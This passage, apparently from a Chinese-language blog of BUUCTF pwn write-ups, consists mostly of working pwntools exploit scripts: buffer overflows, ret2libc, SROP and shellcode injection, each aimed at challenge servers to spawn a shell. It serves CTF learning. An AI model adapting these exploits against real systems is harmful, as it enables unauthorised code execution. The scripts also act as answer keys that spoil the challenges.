*</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27031</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x0000000000400620</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x88</span> + p64(backdoor)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&quot;Input your message:\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h3><p>ret2libc：libc6_2.23-0ubuntu10_amd64</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./babyrop2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>, <span class="number">29428</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;babyrop2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400733</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000400731</span> </span><br><span class="line">format_str = <span class="number">0x0000000000400770</span>  <span class="comment">#%s所在字符串</span></span><br><span class="line">ret_addr = <span class="number">0x0000000000400734</span></span><br><span class="line"></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_plt = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(format_str)+p64(pop_rsi_r15)+p64(read_got)+p64(<span class="number">0</span>)+p64(printf_plt)+p64(main_plt)</span><br><span class="line"><span class="comment">#函数调用约定 先rdi 再rsi 是因为没有pop_rsi才用pop_rsi_r15 所以要设置r15=0</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;name? &quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /home/babyrop2</span><br><span class="line"></span><br><span class="line">cat flag</span><br></pre></td></tr></table></figure><h3 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h3><p>LibcSearcher试遍均segment fault，只能用现成的偏移</p><p>以前的exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn2_sctf_2016&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26421</span>)</span><br><span class="line"></span><br><span class="line">pad = <span class="string">&#x27;0&#x27;</span> * <span class="number">48</span></span><br><span class="line">vuln_addr = <span class="number">0x0804852f</span></span><br><span class="line">format_addr = <span class="number">0x080486f8</span></span><br><span class="line">printf_addr = <span class="number">0x08048370</span></span><br><span class="line">printf_got_addr = <span class="number">0x0804a00c</span></span><br><span class="line">anchor_symbol = <span class="string">&#x27;printf&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过溢出得到printf的内存地址</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;read?&#x27;</span>.encode())</span><br><span class="line">sh.sendline(<span class="string">&#x27;-1&#x27;</span>.encode())</span><br><span class="line">sh.recvline()</span><br><span class="line">payload = pad.encode() + p32(printf_addr) + p32(vuln_addr) + p32(format_addr) + p32(printf_got_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment"># sh.recvline()</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;said: &#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;said: &#x27;</span>)</span><br><span class="line"><span class="comment"># content = sh.recvline()[10:14]</span></span><br><span class="line"><span class="comment"># mem_printf_addr = int.from_bytes(content, &#x27;little&#x27;)</span></span><br><span class="line">mem_printf_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;printf: %#x -&gt; %s&quot;</span> % (printf_got_addr, <span class="built_in">hex</span>(mem_printf_addr)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过溢出得到atoi的内存地址</span></span><br><span class="line">atoi_got_addr = <span class="number">0x0804a01c</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;read?&#x27;</span>.encode())</span><br><span class="line">sh.sendline(<span class="string">&#x27;-1&#x27;</span>.encode())</span><br><span class="line">sh.recvline()</span><br><span class="line">payload = pad.encode() + p32(printf_addr) + p32(vuln_addr) + p32(format_addr) + p32(atoi_got_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment"># sh.recvline()</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;said: &#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;said: &#x27;</span>)</span><br><span class="line"><span class="comment"># content = sh.recvline()[10:14]</span></span><br><span class="line"><span class="comment"># mem_printf_addr = int.from_bytes(content, &#x27;little&#x27;)</span></span><br><span class="line">mem_atoi_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;atoi: %#x -&gt; %s&quot;</span> % (atoi_got_addr, <span class="built_in">hex</span>(mem_atoi_addr)))</span><br><span class="line"></span><br><span class="line">mem_addr = mem_printf_addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过新版LibcSearcher得到系统函数偏移地址。因为得到的结果是错误的，因此注释掉</span></span><br><span class="line"><span class="comment"># obj = LibcSearcher(anchor_symbol, mem_addr) # 使用一个已知符号地址作为初始约束，初始化 LibcSearcher</span></span><br><span class="line"><span class="comment"># obj.add_condition(&quot;__libc_start_main&quot;, mem_main_addr) # 添加一个约束条件</span></span><br><span class="line"><span class="comment"># idx = 0</span></span><br><span class="line"><span class="comment"># if len(sys.argv) &gt;= 2:</span></span><br><span class="line"><span class="comment"># idx = int(sys.argv[len(sys.argv) - 1])</span></span><br><span class="line"><span class="comment"># objlen = len(obj)</span></span><br><span class="line"><span class="comment"># obj.select_libc(idx)</span></span><br><span class="line"><span class="comment"># print(&quot;%d/%d -&gt; %s &quot; % (idx, objlen, obj))</span></span><br><span class="line"><span class="comment"># libc_anchor_offset = obj.dump(anchor_symbol)</span></span><br><span class="line"><span class="comment"># libc_system_offset = obj.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment"># libc_binsh_offset = obj.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过老版本LibcSearcher得到的偏移地址，直接拷贝过来的</span></span><br><span class="line">libc_anchor_offset = <span class="number">0x49020</span></span><br><span class="line">libc_system_offset = <span class="number">0x3a940</span></span><br><span class="line">libc_binsh_offset = <span class="number">0x15902b</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_anchor_offset = libc.sym[anchor_symbol]</span></span><br><span class="line"><span class="comment"># libc_system_offset = libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment"># libc_binsh_offset = next(libc.search(b&#x27;/bin/sh&#x27;))</span></span><br><span class="line">mem_libc_base = mem_addr - libc_anchor_offset</span><br><span class="line">mem_system_addr = mem_libc_base + libc_system_offset</span><br><span class="line">mem_binsh_addr = mem_libc_base + libc_binsh_offset</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot; binsh=%x, system=%x&quot;</span> % (mem_binsh_addr, mem_system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过单字节发送将系统地址存在gmon_start_got_addr处。如果系统地址中无0x00字节，完全不需要此步骤</span></span><br><span class="line">gmon_start_got_addr = <span class="number">0x0804a014</span></span><br><span class="line">gmon_start_plt_addr = <span class="number">0x08048390</span></span><br><span class="line">getn_addr = <span class="number">0x080484e3</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;read?&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;-1&#x27;</span>.encode())</span><br><span class="line">    sh.recvline()</span><br><span class="line">    payload1 = pad.encode() + p32(getn_addr) + p32(vuln_addr) + p32(gmon_start_got_addr + i) + p32(<span class="number">0x12345678</span>)</span><br><span class="line">    sh.sendline(payload1)</span><br><span class="line">    sh.recvline()</span><br><span class="line">    pos_start = <span class="number">2</span> * (<span class="number">4</span> - i)</span><br><span class="line">    pos_end = pos_start + <span class="number">2</span></span><br><span class="line">    onebyte = <span class="built_in">hex</span>(mem_system_addr)[pos_start:pos_end]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;==&gt;&quot;</span> + onebyte)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(onebyte, <span class="number">16</span>) == <span class="number">0</span>:</span><br><span class="line">        sh.send(p8(<span class="number">0</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sh.sendline(p8(<span class="built_in">int</span>(onebyte, <span class="number">16</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过溢出得到gmon_start_got_addr地址，验证地址是否写入成功，非必须，可以删除</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;read?&#x27;</span>.encode())</span><br><span class="line">sh.sendline(<span class="string">&#x27;-1&#x27;</span>.encode())</span><br><span class="line">sh.recvline()</span><br><span class="line">payload = pad.encode() + p32(printf_addr) + p32(vuln_addr) + p32(format_addr) + p32(gmon_start_got_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment"># sh.recvline()</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;said: &#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;said: &#x27;</span>)</span><br><span class="line"><span class="comment"># content = sh.recvline()[10:14]</span></span><br><span class="line"><span class="comment"># mem_printf_addr = int.from_bytes(content, &#x27;little&#x27;)</span></span><br><span class="line">mem_gmon_start_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;gmon_start: %#x -&gt; %s&quot;</span> % (gmon_start_got_addr, <span class="built_in">hex</span>(mem_gmon_start_addr)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过system(&quot;/bin/sh&quot;)获取shell</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;read?&#x27;</span>.encode())</span><br><span class="line">sh.sendline(<span class="string">&#x27;-1&#x27;</span>.encode())</span><br><span class="line">sh.recvline()</span><br><span class="line">payload1 = pad.encode() + p32(gmon_start_plt_addr) + p32(vuln_addr) + p32(mem_binsh_addr)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop chain"></a>picoctf_2018_rop chain</h3><p>IDA反汇编比较语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:08048693 cmp     [ebp+arg_0], 0DEADBAADh</span><br><span class="line">.text:080485E9 cmp     [ebp+arg_0], 0BAAAAAADh</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29147</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">win_func1_addr = <span class="number">0x080485CB</span></span><br><span class="line">win_func2_addr = <span class="number">0x080485D8</span></span><br><span class="line">flag_func_addr = <span class="number">0x0804862B</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">0x18</span> + <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span> + p32(win_func1_addr) + p32(win_func2_addr) + p32(flag_func_addr) + p32(<span class="number">0xBAAAAAAD</span>) + p32(<span class="number">0xDEADBAAD</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Enter your input&gt; &quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h3><p>官方github仓库给的libc是错误的，实际是libc-2.23.so</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>, <span class="number">27047</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;level3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">vuln_addr = elf.symbols[<span class="string">&#x27;vulnerable_function&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(write_plt) + p32(vuln_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_real_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = write_real_addr - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;libc_base: &#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(system_addr) + p32(<span class="number">0x12345678</span>) + p32(bin_sh)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h3><p>关键在通过泄露出来的代码段0x400536地址对应的栈地址找到 &#x2F;bin&#x2F;sh 的偏移</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">buf = byte ptr -10h</span><br><span class="line">lea rsi, [rsp+buf]</span><br></pre></td></tr></table></figure><p>gdb在SYS_write这个地方看到rsp-0x10往上走0x7fffffffdd08这个栈地址对应的代码地址为0x400536，我们泄露出来这个位置——为什么要泄露这个地址，因为前后无法泄露不是有效的栈地址，而是一些junk数据和变量数据，我们泄露0x400536这个位置，得到的就是栈地址，将这个栈地址往前走，0x0a70756574697277（当然这个地方是gdb调试随便输的数据，实际exp写的是&#x2F;bin&#x2F;sh\x00），这个地方栈里面存放的就是bin&#x2F;sh\x00，算出来存放0x400536的栈地址-0x118刚好是bin&#x2F;sh\x00的栈地址</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1591519184510-a2f38f57-c3f8-4c9a-a150-54aba4bbb9ed.png?x-oss-process=image/format,webp" alt="gdb"></p><p>更重要的是——泄露后第二次进函数的位置要在  v0 &#x3D; sys_read(0, buf, 0x400uLL); 不然会影响栈平衡，第二次链子最前方要写&#x2F;bin&#x2F;sh</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28869</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_s_3&quot;</span>)</span><br><span class="line"></span><br><span class="line">vuln = <span class="number">0x4004ED</span></span><br><span class="line">syscall = <span class="number">0x400517</span></span><br><span class="line">sigreturn = <span class="number">0x4004DA</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="number">2</span> + p64(vuln)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">bin_sh = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x110</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh))</span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = bin_sh</span><br><span class="line">sigframe.rsi = <span class="number">0</span></span><br><span class="line">sigframe.rdx = <span class="number">0</span></span><br><span class="line">sigframe.rip = syscall</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="number">2</span></span><br><span class="line">payload += p64(sigreturn) + p64(syscall) + <span class="built_in">bytes</span>(sigframe)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h3><p>关键在通过泄露的栈地址找到padding（从截断\x00一直覆盖完ebp），然后接上正确的栈返回地址到shellcode即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27261</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Yippie, lets crash: &#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(p.recv(<span class="number">10</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">padding = (<span class="number">0x3B</span>-<span class="number">0x29</span>) * <span class="string">b&#x27;A&#x27;</span></span><br><span class="line">stack = leak - <span class="number">0x1C</span></span><br><span class="line">shellcode = asm(shellcraft.i386.linux.sh())</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;crashme\x00&#x27;</span> + padding + p32(stack) + shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="wustctf2020-getshell"><a href="#wustctf2020-getshell" class="headerlink" title="wustctf2020_getshell"></a>wustctf2020_getshell</h3><blockquote><p>ret2text 入门题目</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28553</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;/_/  /_/\\_,_//_/ /_/ /_//_\\_\\ \n&quot;</span>)</span><br><span class="line">padding = (<span class="number">0x18</span> + <span class="number">0x4</span>) * <span class="string">b&#x27;A&#x27;</span></span><br><span class="line">payload = padding + p32(<span class="number">0x08048524</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="jarvisoj-level3-x64"><a href="#jarvisoj-level3-x64" class="headerlink" title="jarvisoj_level3_x64"></a>jarvisoj_level3_x64</h3><p>ret2csu + ret2libc</p><p>这里其实可以不用ret2csu，有一种很巧妙的机械码错位，比如：<code>41 5E</code>和<code>41 5F</code>对应的是<code>pop r14</code>和<code>pop r15</code>，<code>5E 41 5F</code>对应的就是<code>pop rsi``pop r15</code>，所以取<code>41 5E</code>和<code>41 5F</code>前¼的地址，实现机械码错位即可改成自己想要的gadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 